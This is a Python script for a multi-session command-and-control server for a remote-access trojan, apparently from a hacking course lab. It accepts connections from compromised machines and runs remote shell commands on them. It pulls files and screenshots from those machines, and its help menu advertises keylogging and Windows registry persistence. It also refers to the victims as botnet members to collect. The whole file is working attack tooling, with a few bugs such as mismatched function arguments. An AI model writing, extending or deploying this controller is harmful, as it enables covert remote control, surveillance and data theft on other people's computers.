import socket
import termcolor
import json
import os
import threading


def reliable_recv(target):
    data = ''
    while True:
        try:
            data = data + target.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue


def reliable_send(target, data):
    json_data = json.dumps(data)
    target.send(json_data.encode())


def upload_file(target, file_name):
    f = open(file_name, 'rb')  # Read as bytes, since we need to send Byte data
    target.send(f.read())  # Read the file in bytes and send


def download_file(target, file_name):
    f = open(file_name, 'wb')  # Open file for writing in bytes
    target.settimeout(1)  # so we can get the end of file
    chunk = target.recv(1024)  # Receive first 1024 bytes of data
    while chunk:  # While we got data
        f.write(chunk)  # Reconstruct that byte data to our new file
        try:
            chunk = target.recv(1024)  # Try to get more byte, if yes (write), if no (wait for 1 sec and raise timeout exc)
        except socket.timeout as e:  # If timeout is < 1 break loop
            break
    target.settimeout(None)  # set timeout back to None (as empty) so not to affect other socket objects
    f.close()  # successfully retrieved file - then close file


def target_communication(target, ip):
    global targets, ips
    count = 0
    while True:
        command = input('* Shell~%s: ' % str(ip))
        reliable_send(target, command)
        if command == 'quit':
            quit_targ = targets.index(target)
            quit_ip = ips.index(ip)
            target.close()
            targets.pop(quit_targ)
            ips.pop(quit_ip)
            break
        if command == 'background':
            break
        elif command == 'clear':
            os.system('clear')
        elif command[:3] == 'cd ':
            pass
        elif command[:6] == 'upload':
            upload_file(command[7:])
        elif command[:8] == 'download':
            download_file(command[9:])
        elif command[:10] == 'screenshot':
            f = open('screenshot%d' % count, 'wb')  # Open file for writing in bytes
            target.settimeout(3)  # so we can get the end of file
            chunk = target.recv(1024)  # Receive first 1024 bytes of data
            while chunk:  # While we got data
                f.write(chunk)  # Reconstruct that byte data to our new file
                try:
                    chunk = target.recv(1024)  # Try to get more byte, if yes (write), if no (wait for 1 sec and raise timeout exc)
                except socket.timeout as e:  # If timeout is < 1 break loop
                    break
            target.settimeout(None)  # set timeout back to None (as empty) so not to affect other socket objects
            f.close()  # successfully retrieved file - then close file
            count += 1
        elif command == 'help':
            print(termcolor.colored('''\n
            quit                                    --> Quit session with the target
            background                              --> Background session and go back to C.C.C
            clear                                   --> Clear the screen
            cd <directory_name>                     --> Changes directory on target system
            upload <file_name>                      --> Upload file from target machine
            download <file_name>                    --> Download file from target machine
            screenshot                              --> Takes a screenshot of target machine
            keylog_start                            --> Start the Keylogger
            keylog_dump                             --> Print Keystroke that the target inputted
            keylog_stop                             --> Stop and Self-Destruct Keylogger file
            persistence <RegName> <FileName>        --> Create Persistence in Registry'''), 'green')
        else:
            result = reliable_recv(target)
            print(result)


def accept_connection():
    while True:
        if stop_flag:
            break
        sock.settimeout(1)
        try:
            target, ip = sock.accept()
            targets.append(target)
            ips.append(ip)
            print(termcolor.colored(str(ip) + ' has connected!', 'green'))
        except:
            pass


targets = []
ips = []
stop_flag = False
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.bind(('10.0.2.15', 5555))
sock.listen(5)
t1 = threading.Thread(target=accept_connection)
t1.start()
print(termcolor.colored('[+] Waiting for the incoming connections...', 'green'))

while True:
    command = input('[**] Command & Control Center: ')
    if command == 'targets':
        counter = 0
        if len(targets) > 0 and len(ips) > 0:
            for ip in ips:
                print('Session ' + str(counter) + ' --- ' + str(ip))
                counter += 1
        else:
            print(termcolor.colored('No Botnets in CCC server. Get more now =_= !!', 'red'))
    elif command == 'clear':
        os.system('clear')
    elif command[:7] == 'session':
        try:
            num = int(command[8:])
            target_num = targets[num]
            target_ip = ips[num]
            target_communication(target_num, target_ip)
        except:
            print('[-] No Session under that ID Number')
    elif command == 'exit':
        for target in targets:
            reliable_send(target, 'quit')
            target.close()
        targets.clear()
        ips.clear()
        sock.close()
        stop_flag = True
        t1.join()
        break
    elif command[:4] == 'kill':
        targ = targets[int(command[5:])]
        ip = ips[int(command[5:])]
        reliable_send(targ, 'quit')
        targ.close()
        targets.remove(targ)
        ips.remove(ip)
    elif command[:7] == 'sendall':
        x = len(targets)
        print(x)
        i = 0
        try:
            while i < x:
                tar_number = targets[i]
                print(tar_number)
                reliable_send(tar_number, command)
                i += 1
        except:
            print('[-] Failed')
    else:
        print(termcolor.colored('[!!] Command Doesnt exist', 'red'))
